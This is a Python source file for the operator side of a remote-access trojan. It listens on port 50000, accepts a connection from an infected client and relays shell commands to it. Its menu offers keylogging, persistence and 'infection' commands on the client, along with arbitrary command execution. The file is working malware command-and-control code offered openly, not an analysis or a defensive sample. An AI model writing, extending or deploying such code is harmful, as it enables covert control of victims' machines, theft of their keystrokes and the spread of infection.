import socket
import sys

def display_menu():
    print("\nCommand Menu:")
    print("1. cd [path]      - Change directory on client")
    print("2. keylog         - Start keylogger on client")
    print("3. persist        - Enable persistence on client")
    print("4. infect         - Start infection on client")
    print("5. q              - Quit the session")
    print("Enter custom commands to execute directly on client.\n")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        optval = 1
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, optval)

        server_address = ('127.0.0.1', 50000)  # Địa chỉ và cổng của server
        sock.bind(server_address)
        sock.listen(5)

        print("Server is listening on port 50000...")

        try:
            client_socket, client_address = sock.accept()
            print(f"Connection from {client_address}")
            with client_socket:
                while True:
                    buffer = input(f"* Shell#{client_address[0]}~$: ").strip()

                    if buffer == "":
                        print("Please enter something or try 'help' to see menu")
                        continue

                    if buffer.lower() == "help":
                        display_menu()
                        continue

                    client_socket.sendall(buffer.encode())

                    if buffer.startswith("q"):
                        print("Terminating connection.")
                        break
                    else:
                        try:
                            response = client_socket.recv(4096).decode()
                            if not response:
                                print("Client disconnected.")
                                break
                            print(response)
                        except UnicodeDecodeError:
                            print("Received non-UTF-8 data from client.")
                        except socket.error as e:
                            print(f"Error receiving data: {e}")
                            break
        except socket.error as e:
            print(f"Socket error: {e}")
        finally:
            print("Server shut down.")

if __name__ == "__main__":
    main()
